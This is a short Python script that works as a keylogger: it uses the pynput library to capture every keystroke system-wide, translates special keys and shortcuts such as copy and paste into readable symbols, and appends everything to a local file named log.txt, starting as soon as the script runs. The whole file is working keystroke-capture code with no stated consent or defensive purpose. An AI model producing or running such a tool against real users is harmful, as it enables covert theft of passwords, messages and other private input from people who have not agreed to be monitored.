from pynput.keyboard import Listener


def log_file():
    def write_file(key):
        letter = str(key)
        letter = letter.replace("'", "")  # To remove str quotations mark
        # Made some replacement for being human readable
        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift':
            letter = '⇧ '
        if letter == 'Key.caps_lock':
            letter = ''
        if letter == 'Key.cmd':
            letter = '❖ '
        if letter == 'Key.ctrl_r':
            letter = ''
        if letter == 'Key.shift.l':
            letter = ''
        if letter == 'Key.alt_l':
            letter = '⎇ '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == 'Key.right':
            letter = '▶ '
        if letter == 'Key.left':
            letter = '◀ '
        if letter == 'Key.up':
            letter = '▲ '
        if letter == 'Key.down':
            letter = '▼ '
        if letter == 'Key.ctrl_l':
            letter = ''
        if letter == 'Key.home':
            letter = 'home '
        if letter == 'Key.end':
            letter = 'end '
        if letter == 'Key.page_down':
            letter = 'pgdn '
        if letter == 'Key.page_up':
            letter = 'pgup '
        if letter == 'Key.num_lock':
            letter = 'numlk|scrlk '
        if letter == 'Key.esc':
            letter = '␛ '
        if letter == 'Key.enter':
            letter = '↩\n'
        if letter == 'Key.backspace':
            letter = '⌫ '
        if letter == 'Key.tab':
            letter = '↹ '
        if letter == 'Key.print_screen':
            letter = '⎙ '
        if letter == '\\x01':  # ctrl + a
            letter = '-Selected All '
        if letter == '\\x1a':  # ctrl + z
            letter = '-Undo '
        if letter == '\\x03':  # ctrl + c
            letter = '-Copy '
        if letter == '\\x16':  # ctrl + v
            letter = '-Paste '

        with open('log.txt', 'a', encoding='utf-8') as file:  # To show unicode we use encoding='utf-8'
            file.write(letter)

    with Listener(on_press=write_file) as listening:
        listening.join()


log_file()
